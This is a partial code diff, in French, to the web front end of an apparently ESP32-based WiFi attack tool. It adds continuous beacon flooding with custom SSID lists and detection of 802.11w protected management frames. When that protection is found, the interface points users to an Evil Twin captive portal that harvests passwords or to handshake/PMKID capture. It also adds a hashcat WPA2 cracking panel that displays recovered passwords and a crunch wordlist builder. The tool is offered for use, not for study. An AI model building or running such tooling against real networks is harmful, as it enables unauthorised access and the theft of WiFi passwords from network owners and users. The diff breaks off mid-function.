@@ -7,8 +7,17 @@
 <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css">
 <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.css">
 <style>
+  /* ── Variables Bootstrap override (évite le texte noir sur fond sombre) ── */
+  :root {
+    --bs-body-color:    #e6edf3;
+    --bs-body-bg:       #0d1117;
+    --bs-secondary-color: #8b949e;
+    --bs-emphasis-color:  #ffffff;
+  }
+
   /* ── Base ── */
   body { background: #0d1117; color: #e6edf3; font-family: 'Segoe UI', sans-serif; }
+  label { color: #cdd9e5; }
 
   /* ── Navbar ── */
   .navbar { background: #161b22 !important; border-bottom: 1px solid #30363d; }
@@ -33,13 +42,17 @@
   .terminal .info { color: #79c0ff; }
 
   /* ── Buttons ── */
-  .btn-attack          { background: #da3633; border: none; color: #fff; font-weight: 600; }
-  .btn-attack:hover    { background: #b91c1a; color: #fff; }
-  .btn-attack:disabled { background: #6e1c1a; color: #aaa; }
-  .btn-scan            { background: #1f6feb; border: none; color: #fff; font-weight: 600; }
-  .btn-scan:hover      { background: #1158c7; color: #fff; }
-  .btn-sniff           { background: #238636; border: none; color: #fff; font-weight: 600; }
-  .btn-sniff:hover     { background: #196127; color: #fff; }
+  .btn-attack          { background: #da3633 !important; border: none !important; color: #fff !important; font-weight: 600; }
+  .btn-attack:hover    { background: #b91c1a !important; color: #fff !important; }
+  .btn-attack:disabled { background: #6e1c1a !important; color: #888 !important; opacity: 1; }
+  .btn-scan            { background: #1f6feb !important; border: none !important; color: #fff !important; font-weight: 600; }
+  .btn-scan:hover      { background: #1158c7 !important; color: #fff !important; }
+  .btn-sniff           { background: #238636 !important; border: none !important; color: #fff !important; font-weight: 600; }
+  .btn-sniff:hover     { background: #196127 !important; color: #fff !important; }
+  .btn-sniff:disabled  { background: #1a4226 !important; color: #888 !important; opacity: 1; }
+  .btn-outline-danger  { color: #ff7b72 !important; border-color: #ff7b72 !important; }
+  .btn-outline-danger:hover { background: #da3633 !important; color: #fff !important; border-color: #da3633 !important; }
+  .btn-outline-danger:disabled { color: #555 !important; border-color: #444 !important; opacity: 1; }
 
   /* ── Forms ── */
   .form-label { color: #cdd9e5 !important; font-weight: 500; margin-bottom: 4px; }
@@ -92,6 +105,11 @@
   .alert-dark-custom { background: #272115; border: 1px solid #f2cc60;
                        color: #f2cc60; border-radius: 8px; }
 
+  /* ── PMF Alert ── */
+  .pmf-alert-warn { background: #1e1500 !important; border: 1px solid #f2cc60 !important; }
+  .pmf-alert-crit { background: #1e0a0a !important; border: 1px solid #ff7b72 !important; }
+  .pmf-checking   { background: #0d1a2e !important; border: 1px solid #58a6ff !important; }
+
   /* ── Sidebar docs ── */
   .list-group-item { color: #cdd9e5 !important; }
   .list-group-item:hover { color: #58a6ff !important; background: #21262d !important; }
@@ -124,6 +142,7 @@
     <li class="nav-item"><a class="nav-link" href="#" data-tab="beacon"><i class="bi bi-broadcast me-1"></i>Beacon Spam</a></li>
     <li class="nav-item"><a class="nav-link" href="#" data-tab="sniffer"><i class="bi bi-eye me-1"></i>Sniffer</a></li>
     <li class="nav-item"><a class="nav-link" href="#" data-tab="eviltwin"><i class="bi bi-person-badge me-1"></i>Evil Twin</a></li>
+    <li class="nav-item"><a class="nav-link" href="#" data-tab="pmkid"><i class="bi bi-key me-1"></i>WPA2 Crack</a></li>
     <li class="nav-item"><a class="nav-link" href="#" data-tab="docs"><i class="bi bi-book me-1"></i>Manuel</a></li>
   </ul>
 
@@ -223,6 +242,30 @@
               <input type="text" class="form-control"
                      id="deauth-client" placeholder="xx:xx:xx:xx:xx:xx">
             </div>
+            <!-- Alerte PMF -->
+            <div id="deauth-pmf-alert" style="display:none" class="mb-3 p-3 rounded"
+                 style="background:#1a1200; border:1px solid #f2cc60;">
+              <div class="d-flex align-items-center gap-2 mb-2">
+                <i class="bi bi-shield-fill-exclamation" style="color:#f2cc60;font-size:18px"></i>
+                <strong style="color:#f2cc60" id="deauth-pmf-title">PMF / 802.11w détecté</strong>
+                <span id="deauth-pmf-badge" class="badge ms-auto" style="background:#f2cc60;color:#000"></span>
+              </div>
+              <p style="color:#cdd9e5;font-size:13px;margin:0 0 6px">
+                Ce réseau protège ses trames de gestion (802.11w).
+                Les clients modernes ignorent les deauth non signés.
+              </p>
+              <div style="color:#8b949e;font-size:12px" class="mb-2">
+                <strong style="color:#79c0ff">Alternatives :</strong><br>
+                <span>→ </span><a href="#" onclick="switchTab('eviltwin');return false"
+                   style="color:#58a6ff">Evil Twin + portail captif</a>
+                <span style="color:#555"> (client entre le mdp manuellement)</span>
+              </div>
+              <button class="btn btn-scan w-100 mt-1" onclick="switchTab('pmkid')"
+                      id="pmkid-capture-btn" style="font-size:13px">
+                <i class="bi bi-key me-1"></i>Aller à l'onglet WPA2 Crack →
+              </button>
+            </div>
+
             <button class="btn btn-attack w-100" onclick="runDeauth()">
               <i class="bi bi-lightning-fill me-2"></i>Lancer l'attaque Deauth
             </button>
@@ -245,50 +288,118 @@
   <!-- ===== BEACON SPAM ===== -->
   <div class="tab-content" id="tab-beacon" style="display:none">
     <div class="row g-3">
-      <div class="col-md-5">
-        <div class="card">
-          <div class="card-header"><i class="bi bi-broadcast me-2"></i>Beacon Flood</div>
+
+      <!-- Colonne gauche : configuration -->
+      <div class="col-md-4">
+        <div class="card mb-3">
+          <div class="card-header"><i class="bi bi-sliders me-2"></i>Configuration</div>
           <div class="card-body">
             <div class="mb-3">
               <label class="form-label">Mode</label>
-              <select class="form-select" id="beacon-mode"
-                      onchange="toggleBeaconSsid()">
+              <select class="form-select" id="beacon-mode" onchange="toggleBeaconMode()">
                 <option value="random">SSIDs aléatoires</option>
                 <option value="fr">Opérateurs français (Orange/SFR/Free…)</option>
                 <option value="clone">Cloner un SSID précis</option>
+                <option value="custom">Liste personnalisée</option>
               </select>
             </div>
-            <div id="beacon-ssid-div" style="display:none" class="mb-3">
+
+            <!-- Clone SSID (visible uniquement en mode clone) -->
+            <div id="beacon-clone-div" style="display:none" class="mb-3">
               <label class="form-label">SSID à cloner</label>
-              <input type="text" class="form-control"
-                     id="beacon-ssid" placeholder="NomDuReseau">
+              <input type="text" class="form-control" id="beacon-ssid" placeholder="NomDuReseau">
+              <small style="color:#8b949e">Auto-rempli depuis le Scanner</small>
             </div>
+
+            <!-- Liste personnalisée (visible uniquement en mode custom) -->
+            <div id="beacon-custom-div" style="display:none" class="mb-3">
+              <div class="mb-2">
+                <label class="form-label">Noms WiFi <small style="color:#8b949e">(un par ligne)</small></label>
+                <textarea class="form-control" id="beacon-custom-list" rows="5"
+                  placeholder="MonReseau&#10;FreeWifi_Custom&#10;iPhone de Jean&#10;Hotel_Guest&#10;..."></textarea>
+              </div>
+              <div class="mb-2">
+                <label class="form-label">Ou importer un fichier .txt</label>
+                <input type="file" class="form-control" id="beacon-file" accept=".txt" onchange="loadBeaconFile()">
+                <small style="color:#8b949e">Un SSID par ligne</small>
+              </div>
+              <div id="beacon-file-info" style="display:none" class="mb-1">
+                <span class="badge bg-info" id="beacon-file-count"></span>
+              </div>
+            </div>
+
             <div class="mb-3">
-              <label class="form-label">Canal</label>
-              <input type="number" class="form-control"
-                     id="beacon-ch" value="6" min="1" max="13">
+              <label class="form-label">Canal WiFi</label>
+              <input type="number" class="form-control" id="beacon-ch" value="6" min="1" max="13">
             </div>
-            <div class="mb-3">
-              <label class="form-label">Nombre de beacons</label>
-              <input type="number" class="form-control"
-                     id="beacon-count" value="50" min="10" max="500">
+
+            <!-- Contrôles continu -->
+            <div class="p-2 mb-3 rounded" style="background:#0d1117; border:1px solid #238636;">
+              <div class="d-flex align-items-center justify-content-between mb-2">
+                <span style="color:#7ee787; font-weight:600;"><i class="bi bi-infinity me-1"></i>Mode continu</span>
+                <span id="beacon-status-badge" class="badge bg-secondary">Inactif</span>
+              </div>
+              <small style="color:#8b949e">Les réseaux restent visibles sur les téléphones tant que c'est actif.</small>
+              <div class="d-flex gap-2 mt-2">
+                <button class="btn btn-sniff flex-grow-1" id="beacon-start-btn" onclick="startBeaconContinu()">
+                  <i class="bi bi-play-fill me-1"></i>Démarrer
+                </button>
+                <button class="btn btn-outline-danger flex-grow-1" id="beacon-stop-btn" onclick="stopBeacon()" disabled>
+                  <i class="bi bi-stop-fill me-1"></i>Stopper
+                </button>
+              </div>
             </div>
-            <button class="btn btn-attack w-100" onclick="runBeacon()">
-              <i class="bi bi-broadcast me-2"></i>Lancer Beacon Spam
-            </button>
+
+            <!-- Test ponctuel -->
+            <hr style="border-color:#30363d">
+            <label class="form-label">Test ponctuel (N beacons)</label>
+            <div class="d-flex gap-2">
+              <input type="number" class="form-control" id="beacon-count" value="50" min="10" max="500">
+              <button class="btn btn-attack" onclick="runBeacon()" style="white-space:nowrap">
+                <i class="bi bi-broadcast me-1"></i>Envoyer
+              </button>
+            </div>
           </div>
         </div>
       </div>
-      <div class="col-md-7">
-        <div class="card h-100">
-          <div class="card-header"><i class="bi bi-terminal me-2"></i>Sortie</div>
-          <div class="card-body p-2">
-            <div class="terminal" id="beacon-terminal">
-              <span class="info">[~] En attente...</span>
+
+      <!-- Colonne droite : liste live + terminal -->
+      <div class="col-md-8">
+        <div class="row g-3">
+
+          <!-- Liste des réseaux diffusés -->
+          <div class="col-12">
+            <div class="card">
+              <div class="card-header d-flex justify-content-between align-items-center">
+                <span><i class="bi bi-wifi me-2"></i>Réseaux WiFi diffusés</span>
+                <span id="beacon-count-live" class="badge bg-secondary">0 réseau</span>
+              </div>
+              <div class="card-body p-2">
+                <div id="beacon-ssid-list"
+                     style="max-height:200px; overflow-y:auto; display:flex; flex-wrap:wrap; gap:6px; padding:6px;">
+                  <span style="color:#8b949e; font-size:13px;">
+                    <i class="bi bi-info-circle me-1"></i>Démarrez le beacon spam pour voir les réseaux diffusés
+                  </span>
+                </div>
+              </div>
             </div>
           </div>
+
+          <!-- Terminal -->
+          <div class="col-12">
+            <div class="card">
+              <div class="card-header"><i class="bi bi-terminal me-2"></i>Sortie</div>
+              <div class="card-body p-2">
+                <div class="terminal" id="beacon-terminal" style="height:200px">
+                  <span class="info">[~] En attente...</span>
+                </div>
+              </div>
+            </div>
+          </div>
+
         </div>
       </div>
+
     </div>
   </div>
 
@@ -372,6 +483,25 @@
               <input type="text" class="form-control"
                      id="et-bssid" placeholder="BSSID de l'AP réel (optionnel)">
             </div>
+            <!-- Alerte PMF Evil Twin -->
+            <div id="et-pmf-alert" style="display:none" class="mb-3 p-3 rounded">
+              <div class="d-flex align-items-center gap-2 mb-2">
+                <i class="bi bi-shield-fill-exclamation" style="color:#f2cc60;font-size:18px"></i>
+                <strong style="color:#f2cc60" id="et-pmf-title">PMF / 802.11w détecté</strong>
+                <span id="et-pmf-badge" class="badge ms-auto" style="background:#f2cc60;color:#000"></span>
+              </div>
+              <p style="color:#cdd9e5;font-size:13px;margin:0 0 4px">
+                Le Deauth automatique sera ignoré par les clients modernes.
+                <strong style="color:#7ee787">L'Evil Twin reste utile</strong> : le client devra se reconnecter manuellement et entrer son mot de passe dans le portail captif.
+              </p>
+              <p style="color:#8b949e;font-size:12px;margin:0 0 6px">
+                → Laissez le BSSID vide pour désactiver le deauth et attendre la connexion naturelle.
+              </p>
+              <button class="btn btn-scan w-100 btn-sm" onclick="switchTab('pmkid')" style="font-size:12px">
+                <i class="bi bi-key me-1"></i>Capturer PMKID via ESP32 →
+              </button>
+            </div>
+
             <div class="d-flex gap-2 mb-2">
               <button class="btn btn-attack flex-grow-1" id="et-start-btn" onclick="startEvilTwin()">
                 <i class="bi bi-person-badge me-2"></i>Démarrer
@@ -398,6 +528,257 @@
             </div>
           </div>
         </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ===== WPA2 CRACK ===== -->
+  <div class="tab-content" id="tab-pmkid" style="display:none">
+    <div class="row g-3">
+
+      <!-- ── COL GAUCHE : Capture + Hash ── -->
+      <div class="col-lg-6">
+
+        <!-- Cible sélectionnée -->
+        <div class="card mb-3">
+          <div class="card-header d-flex align-items-center gap-2 flex-wrap">
+            <i class="bi bi-crosshair2"></i><span>Cible sélectionnée</span>
+            <div class="ms-auto d-flex gap-2">
+              <label class="btn btn-outline-secondary btn-sm py-0 mb-0"
+                     style="font-size:11px;cursor:pointer" title="Charger un .hc22000 existant sans recapturer">
+                <i class="bi bi-folder2-open me-1"></i>Hash existant
+                <input type="file" accept=".hc22000,.txt" style="display:none" onchange="loadHashFile(this)">
+              </label>
+              <button class="btn btn-scan btn-sm" onclick="startPmkidCapture()">
+                <i class="bi bi-play-fill me-1"></i>Démarrer la capture
+              </button>
+            </div>
+          </div>
+          <div class="card-body py-2">
+            <div class="row g-1 mb-2" style="font-size:13px">
+              <div class="col-6"><span class="text-muted">SSID :</span> <strong id="pmkid-info-ssid">—</strong></div>
+              <div class="col-6"><span class="text-muted">BSSID :</span> <code id="pmkid-info-bssid" style="color:#79c0ff">—</code></div>
+              <div class="col-4"><span class="text-muted">Canal :</span> <strong id="pmkid-info-ch">—</strong></div>
+              <div class="col-8"><span class="text-muted">PMF :</span> <span id="pmkid-info-pmf">—</span></div>
+            </div>
+            <div class="p-2 rounded" style="background:#0d1a2e;border:1px solid #1f3a5e;font-size:12px;color:#cdd9e5">
+              <i class="bi bi-info-circle me-1" style="color:#58a6ff"></i>
+              Désactivez le WiFi sur un appareil client, puis réactivez-le — il se reconnectera à l'AP et enverra le handshake EAPOL.
+            </div>
+          </div>
+        </div>
+
+        <!-- Terminal capture -->
+        <div class="card mb-3">
+          <div class="card-header"><i class="bi bi-terminal me-2"></i>Journal de capture</div>
+          <div class="terminal" id="pmkid-terminal"
+               style="height:300px;border:none;border-radius:0 0 10px 10px">
+            <span class="info">[~] Sélectionnez un réseau dans le Scanner, puis cliquez sur "Démarrer la capture".</span>
+          </div>
+        </div>
+
+        <!-- Hash résultat (masqué jusqu'à capture réussie) -->
+        <div id="pmkid-hash-section" style="display:none">
+          <div class="card">
+            <div class="card-header d-flex align-items-center justify-content-between">
+              <span><i class="bi bi-file-earmark-lock2 me-2" style="color:#3fb950"></i>Hash — hc22000</span>
+              <label class="btn btn-sm py-0 px-2 mb-0"
+                     style="background:#21262d;border:1px solid #30363d;color:#58a6ff;font-size:11px;cursor:pointer">
+                <i class="bi bi-folder2-open me-1"></i>Charger .hc22000
+                <input type="file" accept=".hc22000,.txt" style="display:none" onchange="loadHashFile(this)">
+              </label>
+            </div>
+            <div class="card-body">
+              <textarea class="form-control mb-2" id="pmkid-hash-box" rows="3"
+                        style="font-size:10px;font-family:monospace;word-break:break-all;resize:vertical"
+                        oninput="parseHashDisplay()"></textarea>
+
+              <!-- Parsing visuel du hash hc22000 -->
+              <div id="hash-parsed" style="display:none" class="mb-2 rounded p-2"
+                   style="background:#0d1117;border:1px solid #30363d">
+                <div style="font-size:11px;color:#58a6ff;font-weight:600;margin-bottom:6px">
+                  <i class="bi bi-diagram-3 me-1"></i>Décomposition du hash
+                </div>
+                <table style="width:100%;font-size:11px;border-collapse:collapse" id="hash-parsed-table">
+                </table>
+              </div>
+
+              <small class="text-muted">Utilisable directement avec hashcat en ligne de commande, ou lancez le crack ci-contre.</small>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- ── COL DROITE : Wordlist + Hashcat + Crunch ── -->
+      <div class="col-lg-6">
+
+        <!-- Hashcat -->
+        <div class="card mb-3">
+          <div class="card-header"><i class="bi bi-cpu me-2"></i>Crack WPA2 — hashcat</div>
+          <div class="card-body">
+
+            <!-- Wordlist selector -->
+            <div class="mb-3">
+              <label class="form-label d-flex align-items-center justify-content-between mb-1">
+                <span>Wordlist</span>
+                <button class="btn btn-sm py-0 px-2" onclick="toggleCrunchBuilder()"
+                        style="background:#21262d;border:1px solid #30363d;color:#58a6ff;font-size:11px">
+                  <i class="bi bi-tools me-1"></i>Créer / Enrichir
+                </button>
+              </label>
+              <select class="form-select form-select-sm" id="pmkid-wordlist-sel" style="font-size:12px">
+                <option value="">Chargement…</option>
+              </select>
+            </div>
+
+            <!-- Device -->
+            <div class="mb-3">
+              <label class="form-label">Device
+                <small id="pmkid-device-info" style="color:#8b949e;font-size:11px;margin-left:4px"></small>
+              </label>
+              <select class="form-select" id="pmkid-device">
+                <option value="">Auto</option>
+              </select>
+            </div>
+
+            <div class="d-flex gap-2">
+              <button class="btn btn-attack flex-grow-1" id="hashcat-start-btn" onclick="launchHashcat()">
+                <i class="bi bi-key-fill me-2"></i>Lancer hashcat
+              </button>
+              <button class="btn btn-outline-danger" id="hashcat-stop-btn" onclick="stopHashcat()"
+                      style="display:none;min-width:90px">
+                <i class="bi bi-stop-fill me-1"></i>Arrêter
+              </button>
+            </div>
+
+            <div id="pmkid-result" style="display:none;background:#0a2a0a;border:1px solid #3fb950"
+                 class="mt-3 p-3 rounded text-center">
+              <div style="color:#7ee787;font-size:18px;font-weight:700">
+                <i class="bi bi-unlock-fill me-2"></i>Mot de passe :
+                <span class="pmkid-pwd" style="color:#fff"></span>
+                <button class="btn btn-sm btn-outline-success ms-2"
+                        onclick="navigator.clipboard.writeText(document.querySelector('.pmkid-pwd').textContent)">
+                  <i class="bi bi-clipboard"></i>
+                </button>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- Crunch builder card (masqué par défaut, toggle via bouton Créer/Enrichir) -->
+        <div class="card" id="crunch-builder" style="display:none">
+          <div class="card-header" style="color:#58a6ff">
+            <i class="bi bi-hammer me-2"></i>Générateur de wordlist — crunch
+          </div>
+          <div class="card-body">
+
+            <!-- Ligne 1 : Nom + Mode (toujours visible) -->
+            <div class="row g-2 mb-3">
+              <div class="col-md-7">
+                <label class="form-label" style="font-size:11px">Nom de la liste</label>
+                <input type="text" class="form-control form-control-sm" id="crunch-name"
+                       placeholder="ex: digits_9" style="font-size:12px">
+              </div>
+              <div class="col-md-5">
+                <label class="form-label" style="font-size:11px">Mode</label>
+                <div class="d-flex gap-3" style="font-size:12px;margin-top:6px">
+                  <label style="cursor:pointer">
+                    <input type="radio" name="crunch-mode" value="new" checked
+                           onchange="toggleCrunchAppend()"> Nouvelle
+                  </label>
+                  <label style="cursor:pointer">
+                    <input type="radio" name="crunch-mode" value="append"
+                           onchange="toggleCrunchAppend()"> Enrichir
+                  </label>
+                </div>
+              </div>
+            </div>
+            <select class="form-select form-select-sm mb-3" id="crunch-append-sel"
+                    style="display:none;font-size:12px">
+              <option value="">Choisir une liste à enrichir…</option>
+            </select>
+
+            <!-- Checkbox motif — pivote entre les 2 modes -->
+            <div class="mb-2">
+              <label class="d-flex align-items-center gap-2 form-label"
+                     style="font-size:12px;cursor:pointer;border:1px solid #30363d;
+                            border-radius:6px;padding:6px 10px;background:#161b22">
+                <input type="checkbox" id="crunch-use-pattern" onchange="toggleCrunchPattern()">
+                <span>Mode <strong style="color:#ffa657">motif fixe</strong> (-t)
+                  <small style="color:#8b949e;font-size:10px"> — ex: Password%%%%%./\*</small>
+                </span>
+                <span class="ms-auto" style="font-size:10px;color:#8b949e" id="crunch-mode-hint">
+                  mode charset
+                </span>
+              </label>
+            </div>
+
+            <!-- Section A : Charset + longueur (visible par défaut) -->
+            <div id="crunch-charset-section">
+              <div class="row g-2 mb-2">
+                <div class="col-6">
+                  <label class="form-label" style="font-size:11px">Long. min</label>
+                  <input type="number" class="form-control form-control-sm" id="crunch-min"
+                         value="8" min="1" max="20" onchange="updateCrunchEstimate()" style="font-size:12px">
+                </div>
+                <div class="col-6">
+                  <label class="form-label" style="font-size:11px">Long. max</label>
+                  <input type="number" class="form-control form-control-sm" id="crunch-max"
+                         value="8" min="1" max="20" onchange="updateCrunchEstimate()" style="font-size:12px">
+                </div>
+              </div>
+              <label class="form-label" style="font-size:11px">Jeu de caractères</label>
+              <div class="d-flex flex-wrap gap-3 mb-2" style="font-size:12px">
+                <label style="cursor:pointer"><input type="radio" name="crunch-preset" value="0123456789"
+                  onchange="updateCrunchEstimate()" checked> Chiffres (0-9)</label>
+                <label style="cursor:pointer"><input type="radio" name="crunch-preset" value="abcdefghijklmnopqrstuvwxyz"
+                  onchange="updateCrunchEstimate()"> Minuscules</label>
+                <label style="cursor:pointer"><input type="radio" name="crunch-preset" value="ABCDEFGHIJKLMNOPQRSTUVWXYZ"
+                  onchange="updateCrunchEstimate()"> Majuscules</label>
+                <label style="cursor:pointer"><input type="radio" name="crunch-preset"
+                  value="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+                  onchange="updateCrunchEstimate()"> AlphaNum</label>
+                <label style="cursor:pointer"><input type="radio" name="crunch-preset" value="custom"
+                  onchange="updateCrunchEstimate()"> Personnalisé :
+                  <input type="text" class="form-control form-control-sm d-inline" id="crunch-custom-charset"
+                         placeholder="abc123@!" style="width:90px;font-size:11px"
+                         oninput="document.querySelector('[name=crunch-preset][value=custom]').checked=true;updateCrunchEstimate()">
+                </label>
+              </div>
+            </div>
+
+            <!-- Section B : Motif (masqué par défaut) -->
+            <div id="crunch-pattern-div" style="display:none" class="mb-2">
+              <input type="text" class="form-control form-control-sm mb-1" id="crunch-pattern"
+                     placeholder="ex: Password%%%%%./\*  ou  Airbox-%%%%"
+                     oninput="syncPatternLength()"
+                     style="font-size:13px;font-family:monospace;letter-spacing:1px">
+              <div style="font-size:11px;color:#8b949e">
+                <code style="color:#79c0ff">@</code> = a-z &nbsp;
+                <code style="color:#d2a8ff">,</code> = A-Z &nbsp;
+                <code style="color:#ffa657">%</code> = 0-9 &nbsp;
+                <code style="color:#ff7b72">^</code> = spéciaux &nbsp;
+                <span style="color:#7ee787">autre</span> = littéral fixe
+              </div>
+              <div id="crunch-pattern-hint" style="font-size:11px;color:#58a6ff;display:none;margin-top:3px">
+                longueur : <strong id="crunch-pat-len">0</strong> — min/max auto
+              </div>
+              <div id="crunch-pattern-preview" style="display:none;font-size:12px;font-family:monospace;
+                   background:#161b22;padding:4px 10px;border-radius:4px;color:#7ee787;margin-top:4px"></div>
+            </div>
+
+            <div id="crunch-estimate" class="mb-3 p-2 rounded"
+                 style="background:#161b22;font-size:12px;color:#8b949e">
+              Estimation : calcul en cours…
+            </div>
+
+            <button class="btn btn-scan w-100" onclick="buildWordlist()">
+              <i class="bi bi-hammer me-1"></i>Générer avec crunch
+            </button>
+            <div class="terminal mt-2" id="crunch-terminal" style="height:130px;display:none"></div>
+          </div>
+        </div>
+
       </div>
     </div>
   </div>
@@ -699,10 +1080,89 @@ function selectNetwork(idx) {
   document.querySelectorAll('tr.selectable')[idx].classList.add('selected');
   const n = networks[idx];
   document.getElementById('deauth-bssid').value = n.bssid;
-  document.getElementById('deauth-ch').value = n.ch;
-  document.getElementById('et-ssid').value = n.ssid;
-  document.getElementById('et-ch').value = n.ch;
-  document.getElementById('et-bssid').value = n.bssid;
+  document.getElementById('deauth-ch').value    = n.ch;
+  document.getElementById('et-ssid').value      = n.ssid;
+  document.getElementById('et-ch').value        = n.ch;
+  document.getElementById('et-bssid').value     = n.bssid;
+  document.getElementById('beacon-ssid').value  = n.ssid;
+  document.getElementById('beacon-ch').value    = n.ch;
+  _pmkidTarget = {bssid: n.bssid, ch: n.ch, ssid: n.ssid};
+  updatePmkidInfo();
+  checkPMF(n.bssid, n.ch, n.ssid);
+}
+
+// ── PMF Detection ──────────────────────────────────────────────────────────
+function _pmfSetState(ids, state, title, badge, badgeClass) {
+  ids.forEach(id => {
+    const el = document.getElementById(id);
+    el.style.display = state === 'hide' ? 'none' : '';
+    el.className     = 'mb-3 p-3 rounded ' + (state === 'checking' ? 'pmf-checking' :
+                        state === 'warn' ? 'pmf-alert-warn' : 'pmf-alert-crit');
+  });
+  ids.forEach(id => {
+    const t = document.getElementById(id.replace('-alert', '-pmf-title') + '');
+    const b = document.getElementById(id.replace('-alert', '-pmf-badge') + '');
+    if (t) t.textContent = title;
+    if (b) { b.textContent = badge; b.style.background = badgeClass === 'warn' ? '#f2cc60' : '#ff7b72'; b.style.color = '#000'; }
+  });
+}
+
+let _pmfBssid = null;
+function checkPMF(bssid, ch, ssid) {
+  if (_pmfBssid === bssid) return;
+  _pmfBssid = bssid;
+  const alerts = ['deauth-pmf-alert', 'et-pmf-alert'];
+
+  // Affiche état "vérification en cours"
+  alerts.forEach(id => {
+    const el = document.getElementById(id);
+    el.style.display = '';
+    el.className = 'mb-3 p-3 rounded pmf-checking';
+    el.querySelector('strong').textContent = 'Vérification PMF en cours…';
+    el.querySelector('strong').style.color = '#58a6ff';
+    const ico = el.querySelector('i');
+    if (ico) { ico.className = 'bi bi-hourglass-split'; ico.style.color = '#58a6ff'; }
+    const badge = el.querySelector('.badge');
+    if (badge) badge.textContent = '';
+  });
+
+  fetch('/api/pmf_check', {
+    method: 'POST', headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({bssid, channel: ch})
+  }).then(r => r.json()).then(d => {
+    if (!d.ok || !d.found) {
+      alerts.forEach(id => { document.getElementById(id).style.display = 'none'; });
+      return;
+    }
+    if (!d.pmf_capable && !d.pmf_required) {
+      // Pas de PMF — masquer les alertes
+      alerts.forEach(id => { document.getElementById(id).style.display = 'none'; });
+      return;
+    }
+    const level  = d.pmf_required ? 'crit' : 'warn';
+    const color  = d.pmf_required ? '#ff7b72' : '#f2cc60';
+    const badge  = d.pmf_required ? 'OBLIGATOIRE' : 'OPTIONNEL';
+    const titleD = d.pmf_required
+      ? '⚠ PMF Obligatoire — Deauth totalement bloqué'
+      : '⚠ PMF Actif — Deauth ignoré par les appareils modernes';
+    const titleE = d.pmf_required
+      ? '⚠ PMF Obligatoire — Deauth automatique bloqué'
+      : '⚠ PMF Actif — Le Deauth auto sera ignoré';
+
+    ['deauth-pmf-alert','et-pmf-alert'].forEach((id, i) => {
+      const el = document.getElementById(id);
+      el.style.display = '';
+      el.className = 'mb-3 p-3 rounded ' + (level === 'crit' ? 'pmf-alert-crit' : 'pmf-alert-warn');
+      const ico = el.querySelector('i');
+      if (ico) { ico.className = 'bi bi-shield-fill-exclamation'; ico.style.color = color; }
+      el.querySelector('strong').textContent = i === 0 ? titleD : titleE;
+      el.querySelector('strong').style.color = color;
+      const bdg = el.querySelector('.badge');
+      if (bdg) { bdg.textContent = badge; bdg.style.background = color; bdg.style.color = '#000'; }
+    });
+  }).catch(() => {
+    alerts.forEach(id => { document.getElementById(id).style.display = 'none'; });
+  });
 }
 
 // ── Deauth ─────────────────────────────────────────────────────────────────
@@ -733,9 +1193,55 @@ function runDeauth() {
 }
 
 // ── Beacon Spam ────────────────────────────────────────────────────────────
-function toggleBeaconSsid() {
-  document.getElementById('beacon-ssid-div').style.display =
-    document.getElementById('beacon-mode').value === 'clone' ? '' : 'none';
+function toggleBeaconMode() {
+  const mode = document.getElementById('beacon-mode').value;
+  document.getElementById('beacon-clone-div').style.display  = mode === 'clone'  ? '' : 'none';
+  document.getElementById('beacon-custom-div').style.display = mode === 'custom' ? '' : 'none';
+}
+
+function loadBeaconFile() {
+  const file = document.getElementById('beacon-file').files[0];
+  if (!file) return;
+  const reader = new FileReader();
+  reader.onload = e => {
+    const lines = e.target.result.split(/\r?\n/).map(l => l.trim()).filter(l => l.length > 0);
+    document.getElementById('beacon-custom-list').value = lines.join('\n');
+    const info  = document.getElementById('beacon-file-info');
+    const count = document.getElementById('beacon-file-count');
+    info.style.display = '';
+    count.textContent  = lines.length + ' réseau(x) chargé(s) depuis ' + file.name;
+  };
+  reader.readAsText(file);
+}
+
+function _updateBeaconList(ssids) {
+  const box   = document.getElementById('beacon-ssid-list');
+  const badge = document.getElementById('beacon-count-live');
+  if (!ssids || ssids.length === 0) {
+    box.innerHTML = '<span style="color:#8b949e;font-size:13px"><i class="bi bi-info-circle me-1"></i>Aucun réseau diffusé</span>';
+    badge.textContent = '0 réseau';
+    badge.className   = 'badge bg-secondary';
+    return;
+  }
+  badge.textContent = ssids.length + ' réseau' + (ssids.length > 1 ? 'x' : '');
+  badge.className   = 'badge bg-success';
+  const colors = ['#58a6ff','#79c0ff','#56d364','#d2a8ff','#ffa657','#ff7b72','#7ee787'];
+  box.innerHTML = ssids.map((s, i) => {
+    const col = colors[i % colors.length];
+    return `<span class="badge d-inline-flex align-items-center gap-1" style="background:#161b22;border:1px solid ${col};color:${col};font-size:12px;padding:4px 8px;">
+      <i class="bi bi-wifi"></i>${s.replace(/</g,'&lt;')}</span>`;
+  }).join('');
+}
+
+let _beaconPoll = null;
+
+function _beaconSetRunning(running) {
+  document.getElementById('beacon-start-btn').disabled = running;
+  document.getElementById('beacon-stop-btn').disabled  = !running;
+  const badge = document.getElementById('beacon-status-badge');
+  badge.className   = running ? 'badge bg-success' : 'badge bg-secondary';
+  badge.textContent = running ? 'EN COURS' : 'Inactif';
+  if (!running) _updateBeaconList([]);
 }
 
 function runBeacon() {
@@ -743,18 +1249,112 @@ function runBeacon() {
   const ssid  = document.getElementById('beacon-ssid').value.trim();
   const ch    = +document.getElementById('beacon-ch').value;
   const count = +document.getElementById('beacon-count').value;
-  if (mode === 'clone' && !ssid) { alert('SSID requis pour le mode clone'); return; }
+  const custom = mode === 'custom'
+    ? document.getElementById('beacon-custom-list').value.split(/\r?\n/).map(l=>l.trim()).filter(Boolean)
+    : [];
+  if (mode === 'clone' && !ssid)  { alert('SSID requis pour le mode clone'); return; }
+  if (mode === 'custom' && !custom.length) { alert('Entrez au moins un SSID dans la liste'); return; }
 
   termClear('beacon-terminal');
-  termLog('beacon-terminal', `[>] Beacon spam mode=${mode} ch=${ch} n=${count}`, 'info');
+  termLog('beacon-terminal', `[>] Test ponctuel mode=${mode} ch=${ch} n=${count}`, 'info');
 
   fetch('/api/beacon/spam', {
     method:'POST', headers:{'Content-Type':'application/json'},
